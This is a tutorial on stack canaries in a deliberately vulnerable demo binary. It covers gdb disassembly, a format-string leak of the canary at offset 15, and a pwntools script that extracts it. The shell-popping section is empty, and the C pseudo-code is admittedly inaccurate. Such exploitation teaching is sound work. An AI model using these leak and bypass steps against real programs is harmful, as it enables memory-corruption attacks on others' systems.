# Stack canary: (Stack-cookies, SSP, et cetera, et cetera)
What are stack canaries? What are they used for? Can they be defeated? If so then how?

Stack canaries are a form of user-space binary security mechanisms targeting mitigation towards stack memory corruption, the way it works is very interesting and it's a very hard mitigation to get past, but it can be done. The way they work is by constructing a specific value and pushing it onto the stack after your program, so this value is placed right before the return address of said stack frame. (If you don't know what a stack frame go check out my memory/stack/ directory) So with that being said and with knowledge of what a buffer overflow is and what it results in (control over the return address to hijack control-flow from RIP / EIP) thus for us to control the return address, we will have to hit the canary resulting in a SIGART like so: 

```ocaml
   ~/De/b/stack/stack_canaries ❯ python3 -c 'print("A" * 100)' | ./demo                           4.24   6.84G  100%
Hello! Whats your name?
Hello! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
*** stack smashing detected ***: terminated
[1]    40780 done                 python3 -c 'print("A" * 100)' | 
       40781 abort (core dumped)  ./demo
   ~/De/b/stack/stack_canaries ❯                                                                  4.39   6.83G  100
```
This seems dangerous, how can we defeat this and pop a shell?

# Methods of principle:
```
1. First method of prinicple, is to leak address of the stack. See, the canary value has to be pushed onto the stack to even
work, so with this knowledge, we can take over an arbitrary read of memory, or a given leak. (Second example is very unrealistic 
and unlikely but you'd be surprised) So if there's a format string vulnerability / arbitrary read, we can obtain the randomized 
value of the stack canary and bypass it without failure.

2. This method is a last-resort, it's very time-consuming but it will most likely work 98% of the time. This method is simply 
brute-forcing possible canary values if you don't have a leak. As I said, it'll be extremely agonizing and time-consuming but it 
will more than likely work with succession.

Now let's do some analysis on our binary.
```

# Reverse-engineering:
Let's do some static reverese-engineering on our binary!: (With gdb)
```asm
gef➤  info functions
All defined functions:

Non-debugging symbols:
0x0000000000401000  _init
0x0000000000401030  puts@plt
0x0000000000401040  __stack_chk_fail@plt
0x0000000000401050  printf@plt
0x0000000000401060  read@plt
0x0000000000401070  _start
0x00000000004010a0  _dl_relocate_static_pie
0x00000000004010b0  deregister_tm_clones
0x00000000004010e0  register_tm_clones
0x0000000000401120  __do_global_dtors_aux
0x0000000000401150  frame_dummy
0x0000000000401156  main
0x00000000004011e0  __libc_csu_init
0x0000000000401250  __libc_csu_fini
0x0000000000401258  _fini
gef➤  
```
This is a display at the symbol table and we notice a couple of things at first, we see a ``read@plt`` call more than likely a buffer-overflow, we havne't looked at disassembly yet however, a ``printf@plt`` and a ``puts@plt`` call. Mmmh this could be a format string vulnerability (fore-shadowing!). These are some very interesting looking symbols, let's go have a look at the disassembly of main:
```asm
Dump of assembler code for function main:
   0x0000000000401156 <+0>:     push   rbp
   0x0000000000401157 <+1>:     mov    rbp,rsp
   0x000000000040115a <+4>:     sub    rsp,0x50
   0x000000000040115e <+8>:     mov    rax,QWORD PTR fs:0x28
   0x0000000000401167 <+17>:	mov    QWORD PTR [rbp-0x8],rax
   0x000000000040116b <+21>:	xor    eax,eax
   0x000000000040116d <+23>:	lea    rax,[rip+0xe90]        # 0x402004
   0x0000000000401174 <+30>:	mov    rdi,rax
   0x0000000000401177 <+33>:	call   0x401030 <puts@plt>
   0x000000000040117c <+38>:	lea    rax,[rbp-0x50]
   0x0000000000401180 <+42>:	mov    edx,0x1f4
   0x0000000000401185 <+47>:	mov    rsi,rax
   0x0000000000401188 <+50>:	mov    edi,0x0
   0x000000000040118d <+55>:	call   0x401060 <read@plt>
   0x0000000000401192 <+60>:	lea    rax,[rip+0xe84]        # 0x40201d
   0x0000000000401199 <+67>:	mov    rdi,rax
   0x000000000040119c <+70>:	mov    eax,0x0
   0x00000000004011a1 <+75>:	call   0x401050 <printf@plt>
   0x00000000004011a6 <+80>:	lea    rax,[rbp-0x50]
   0x00000000004011aa <+84>:	mov    rdi,rax
   0x00000000004011ad <+87>:	mov    eax,0x0
   0x00000000004011b2 <+92>:	call   0x401050 <printf@plt>
   0x00000000004011b7 <+97>:	mov    eax,0x0
   0x00000000004011bc <+102>:	mov    rdx,QWORD PTR [rbp-0x8]
   0x00000000004011c0 <+106>:	sub    rdx,QWORD PTR fs:0x28
   0x00000000004011c9 <+115>:	je     0x4011d0 <main+122>
   0x00000000004011cb <+117>:	call   0x401040 <__stack_chk_fail@plt>
   0x00000000004011d0 <+122>:	leave  
   0x00000000004011d1 <+123>:	ret    
End of assembler dump.
gef➤ 
```
Woah, that's a lot to look at! Let's start from top to bottom here, the instruction `` mov    rax,QWORD PTR fs:0x28`` is moving our actual canary into the ``rax`` register. The rest is just the disassembly of our program, we allocate a buffer of ``0x50`` yet for our read call we read ``0x1f4`` amount of bytes, that's our buffer-overflow. And as for the second ``printf@plt`` call we load the effective address of whatever's copied into our ``buffer`` and print that. Let's see if there's an arbitrary read:
```asm
gef➤  r
Starting program: /home/layta/Desktop/binexp/stack/stack_canaries/demo 
Hello! What's your name?
%p
Hello! 0x40201d
[Inferior 1 (process 41205) exited normally]
gef➤  
```
``Hello! 0x40201d`` We do! So it asks for user-input, and I provide a ``%p`` format specificer, this specifier is strictly is for printing hexadecimal addresses. Let's go back at looking at mains disassembly. The instruction ``sub rdx,QWORD PTR fs:0x28`` seems to allocate some space for our stack canary and after this 
there is a comparison and then a call. This is the program checking to see if the canary has been ovewritten! We can visualize this with this C 
psuedo-code:
```c
void stack_canary_fail(void);
{
       puts("[*] You did some fuck shit, goodbye!");
       abort();
}
int main(void) 
{
       void *canary_offset = "0xa85ff23423afca3e00";  // HAS TO BE ENDED WITH AN "\x00"!
       long canary = *(long *)(canary_offset + 0x28) // 0x28 is our canary value offset.
       
       if(canary != *(long *)(canary_offset + 0x28)) // checks to see if the canary value has been written to.
       {
              stack_canary_fail();
              return (-1); // Should not be reached.
       }
       return (0);
} // (Note: Not sure if this is accurate but this is what my understanding would be of it)
```
# Philosophy:
So with the knowledge that I have just relayed, we should have a game-plan on how to bypass a canary and access the return address of a stack-frame, aka game 
over. So how can we leak the stack canary? We can use some arbitrary write magic and print a specific amount of bytes under a specified type, let's see what 
that looks like this:
```ml
   ~/Desktop/binexp/stack/stack_canaries ❯ ./demo                                                                            3.85   6.82G  100%
Hello! What's your name?
%1$p %2$p %3$p %4$p %5$p %6$p %7$p %8$p %9$p %10$p
Hello! 0x40201d (nil) (nil) 0x19 0x7ffff7fa0a60 0x2432252070243125 0x2520702433252070 0x7024352520702434 0x3725207024362520 0x2070243825207024
Hello! What's your name?
```
That's a uhh very strange output. So let me break this down, our program asks for user-input, and due to do fact we have an arbitrary read in our program which we
made sure of earlier and we input a string of random text, this random text can be broken down into this syntax: %(offset of bytes)$(format specifier) I'll go more 
into the concept of format string vulnerabilities aka arbitrary reads and writes of memory. Anyways, if this random input of sequences is leaking memory addresses
on the stack, and stack canary value is on the stack as well, could we therefore leak the value of the canary and whenever the value is checked we can just supply 
the value again? Yes, yes we can and that's exactly what we are going to do, but this raises the question; what does a stack canary look like? As I had shown in 
my pseudo-code of what a stack canary mechanism would look like in C, we can notify that a stack canary will have some identifying qualities to it, namely it WILL
ALWAYS end in NULL-byte (\x00) and more than likely look a lot stranger than all of the other leaked stack addresses, let's see if we can find it!
```asm
gef➤  disass vulnerable
Dump of assembler code for function vulnerable:
   0x0000000000401156 <+0>:     push   rbp
   0x0000000000401157 <+1>:     mov    rbp,rsp
   0x000000000040115a <+4>:     sub    rsp,0x50
   0x000000000040115e <+8>:     mov    rax,QWORD PTR fs:0x28
   0x0000000000401167 <+17>:    mov    QWORD PTR [rbp-0x8],rax
   0x000000000040116b <+21>:    xor    eax,eax
   0x000000000040116d <+23>:    lea    rax,[rip+0xe90]        # 0x402004
   0x0000000000401174 <+30>:    mov    rdi,rax
   0x0000000000401177 <+33>:    call   0x401030 <puts@plt>
   0x000000000040117c <+38>:    lea    rax,[rbp-0x50]
   0x0000000000401180 <+42>:    mov    edx,0x1f4
   0x0000000000401185 <+47>:    mov    rsi,rax
   0x0000000000401188 <+50>:    mov    edi,0x0
   0x000000000040118d <+55>:    call   0x401060 <read@plt>
   0x0000000000401192 <+60>:    lea    rax,[rip+0xe84]        # 0x40201d
   0x0000000000401199 <+67>:    mov    rdi,rax
   0x000000000040119c <+70>:    mov    eax,0x0
   0x00000000004011a1 <+75>:    call   0x401050 <printf@plt>
   0x00000000004011a6 <+80>:    lea    rax,[rbp-0x50]
   0x00000000004011aa <+84>:    mov    rdi,rax
   0x00000000004011ad <+87>:    mov    eax,0x0
   0x00000000004011b2 <+92>:    call   0x401050 <printf@plt>
   0x00000000004011b7 <+97>:    nop
   0x00000000004011b8 <+98>:    mov    rax,QWORD PTR [rbp-0x8]
   0x00000000004011bc <+102>:   sub    rax,QWORD PTR fs:0x28
=> 0x00000000004011c5 <+111>:   je     0x4011cc <vulnerable+118>
   0x00000000004011c7 <+113>:   call   0x401040 <__stack_chk_fail@plt>
   0x00000000004011cc <+118>:   leave  
   0x00000000004011cd <+119>:   ret    
End of assembler dump.
gef➤  
```
We have set a break-point in the symbol vulnerable at offset 111, let's go ahead and run our code and examine the ``rsp`` register and look for this stack canary!
```asm
gef➤  x/15gx $rsp
0x7fffffffdde0: 0x00000000000a7025      0x0000000000000000
0x7fffffffddf0: 0x0000000000000000      0x00007ffff7fcf540
0x7fffffffde00: 0x000000000000000d      0x0000000000000001
0x7fffffffde10: 0x0000000000000001      0x000000000040123d
0x7fffffffde20: 0x0000000000000000      0xc957fbbd260e7900
0x7fffffffde30: 0x00007fffffffde50         0x00000000004011ea
0x7fffffffde40: 0x00007fffffffdf40         0xc957fbbd260e7900
gef➤  
```
Oh shit, would you look at that! Address ``0x7fffffffde40:`` holds our canary value, so 15 seems to be the magic number, let's verify this in our program.
```ml
   ~/Desktop/binexp/stack/stack_canaries ❯ ./demo                                                                             2.58   6.9G  100%
Hello! What's your name?
%15$p
Hello! 0xb8c5891cf8b97a00
Hello! What's your name?
```
# Exploitation:
Jack-pot! We found our canary value in our stack, but see we can't just use this value for our exploit, the canary value will change with every new exection image
meaning we can't hardcode this address, let's construct this script to obtain this stack canary:
```py
#!/usr/bin/env python3

from pwn import *

p = process("./demo")

def canary():
    p.sendline(b"%15$p")
    p.recvuntil(b"Hello! What's your name?\nHello!")

    canary = int(p.recv(19), 16)

    print("%s" % hex(canary))
    return (canary)

canary()
```
This script seems to work!

# Shell!!!:
